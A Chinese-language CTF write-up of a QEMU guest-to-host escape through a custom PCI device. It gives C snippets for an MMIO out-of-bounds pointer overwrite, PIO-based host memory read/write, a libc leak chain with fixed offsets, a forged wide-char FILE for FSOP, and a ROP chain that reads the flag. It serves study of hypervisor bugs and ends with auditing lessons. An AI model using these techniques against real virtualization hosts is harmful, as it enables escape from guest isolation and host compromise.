# qemu playground - 2

## 题目简述

题目在 QEMU 中加入了自定义 PCI 设备 `actf`。设备先要求通过 qemu playground - 1 的 64 字节 Baby Cipher 校验，认证后才允许通过 PIO 访问设备状态中的 `ptr`。MMIO 加密缓冲区大小为 `0x40`，但写处理器的边界检查错误，允许在偏移 `0x40` 继续写 4 字节，恰好覆盖相邻 `ptr` 的低 32 位。

利用目标是把这个 4 字节越界升级为 Host 进程任意地址读写，泄露 libc 后伪造 glibc `FILE` 结构，在 QEMU 退出时触发 FSOP 和 ROP，读取 chroot 内的 `flag`。

## 解题过程

### 1. 完成设备认证

附件只提供了编译后的 QEMU，没有公开设备源码；但配套的第一阶段 `solve.py` 和本题 `exp.c` 给出了完整认证数据。Baby Cipher 的逆运算恢复出 64 字节口令：

```text
ACTF{cH3cK_1n_wI7h_B@by_C1ph3r_Te$t_1n_Q3MU_pl4yg3OuNd_1$_EASy!}
```

这只是设备认证口令，不是本题最终 flag。exp 把它按 4 字节写入 MMIO 偏移 `0x00` 至 `0x3c`，再向 PIO 命令端口写 0 触发校验：

```c
for (int i = 0; i < 0x40; i += 4)
    mmio_write(i, *(uint32_t *)&password[i]);
pmio_write(1, 0);

while (pmio_read(0))
    ;
assert(pmio_read(1) != 0);
```

利用程序把物理地址 `0xfebf1000` 的 MMIO BAR 映射到用户态，并通过 `iopl(3)` 直接访问基址 `0xc040` 的 PIO BAR。上述地址来自附件对应的固定设备枚举结果；若本地 PCI 资源分配不同，应从 `/sys/bus/pci/devices/.../resource` 或 `lspci -vv` 重新确认，不能把它们当成设备协议常量。

### 2. 从低 4 字节覆盖得到 Host 读写

认证后，PIO 偏移 `0x10 + i` 会读写 `ptr[i]` 指向的 Host 内存字节：

```c
uint8_t ptr_read(int i) {
    return inb(PMIO_BASE + 0x10 + i);
}

void ptr_write(int i, uint8_t value) {
    outb(value, PMIO_BASE + 0x10 + i);
}
```

MMIO 偏移 `0x40` 位于 64 字节缓冲区之后。执行：

```c
mmio_write(0x40, target & 0xffffffff);
```

会把 `ptr` 的低 32 位改成 `target` 的低 32 位，而原高 32 位保持不变。随后连续读取或写入 8 个 PIO 字节，就得到该地址处的 64 位读写能力。严格来说，这不是覆盖完整 64 位指针的全地址空间任意读写，而是可访问与原指针拥有相同高 32 位的 4 GiB 窗口；附件的 QEMU、堆和共享库映射恰好能在这个窗口内串起泄露链。

```c
uint64_t leak64(void) {
    uint64_t value = 0;
    for (int i = 0; i < 8; i++)
        value |= (uint64_t)ptr_read(i) << (8 * i);
    return value;
}

void write64(uint64_t value) {
    for (int i = 0; i < 8; i++)
        ptr_write(i, (value >> (8 * i)) & 0xff);
}
```

官方 `leak(base)` 的移位使用了 `i * 8`，因此实际上只在 `base == 0` 时正确；上面的版本把接口收窄为固定读取 8 字节，避免误用。

### 3. 逐级泄露 libc

exp 先从设备默认 `ptr` 指向的对象读取一个 Host 指针并按页对齐，再利用两个构建相关的指针链偏移：

```c
uint64_t page = leak64() & ~0xfffULL;

mmio_write(0x40, (page + 0x8a0) & 0xffffffff);
uint64_t next = leak64();

mmio_write(0x40, (next + 0x870) & 0xffffffff);
uint64_t libc = leak64() - 0x219c80;
```

`0x8a0`、`0x870` 和 `0x219c80` 都来自附件 QEMU 与 Ubuntu 22.04 运行库的本地调试，不是协议字段。复现时应在相同镜像中检查泄露对象，确认最后一个指针确实落在 libc 映射并对应预期符号，然后再计算基址。

官方 exp 随后使用以下版本相关地址：

```text
_IO_2_1_stdin_ = libc + 0x219aa0
_IO_wfile_jumps = libc + 0x2160c0
writable area   = libc + 0x227000
```

### 4. 伪造宽字符 FILE 并栈迁移

exp 把 libc 可写区 `libc + 0x227000` 作为假的 `_IO_wide_data` 和 ROP 栈，再覆盖 `_IO_2_1_stdin_` 的前 `0xe0` 字节。伪造对象的决定性字段是：

```c
uint64_t fake_file[0x20] = {0};
fake_file[5]  = 1;                    /* 使 write_ptr > write_base */
fake_file[20] = fake_wide_data;       /* FILE._wide_data, offset 0xa0 */
fake_file[27] = _IO_wfile_jumps;      /* FILE vtable, offset 0xd8 */
```

QEMU 退出时 glibc 会刷新标准流。上述状态使 `stdin` 进入宽字符输出路径，再从伪造的 `_wide_data` 中取间接调用目标。官方布局把宽字符 vtable 指向同一可写区，并在对应槽位放入 `mov rsp, rdx; ret`，从而把栈迁移到预先写好的 ROP 链。

ROP 使用附件 libc 中的 gadget 和 `open/read/write` 地址，逻辑为：

```text
open("flag", O_RDONLY)
read(flag_fd, fake_wide_data + 0x100, 0x100)
write(2, fake_wide_data + 0x100, 0x100)
```

官方链把 `flag_fd` 硬编码为 0，依赖 QEMU 退出清理阶段已经释放标准输入描述符；输出选用仍连接到 xinetd 的 fd 2。更稳健的链应增加 `mov rdi, rax` 类 gadget，把 `open` 返回值传给 `read`，而不是依赖 fd 分配状态。所有 gadget 偏移同样只适用于附件 libc。

让 Guest 结束并使带 `-no-reboot` 的 QEMU 退出后，伪造流被刷新，ROP 从 Host chroot 的当前目录读出：

```text
ACTF{7ry_b4by_q3mu_ch@1leng3_4nd_g3t_b@by_f1ag}
```

仓库还指出另一条路线：某些 QEMU 构建存在可写且可执行的页面，可用读写原语放入 Shellcode，再覆盖函数指针劫持执行流。不过具体页面和调用点仍需针对附件确认，不能仅凭“存在 RWX”省略控制流分析。

## 方法总结

本题的利用链为：逆向第一阶段口令、通过认证开放 `ptr`、利用 MMIO 末端 4 字节越界改写指针低位、通过 PIO 得到同一 4 GiB 窗口内的读写、沿真实对象指针泄露 libc，最后用宽字符 FSOP 栈迁移到 Host ROP。

关键审计点有两个：一是边界检查必须按对象真实大小拒绝 `offset == size`；二是“只能改低 32 位”不等于危害有限，只要相关映射共享高位，攻击者仍可能遍历足够大的 Host 地址窗口。利用脚本中的绝对 BAR 地址、泄露偏移、libc 符号和 fd 假设都属于部署相关信息，复现时必须逐项验证。
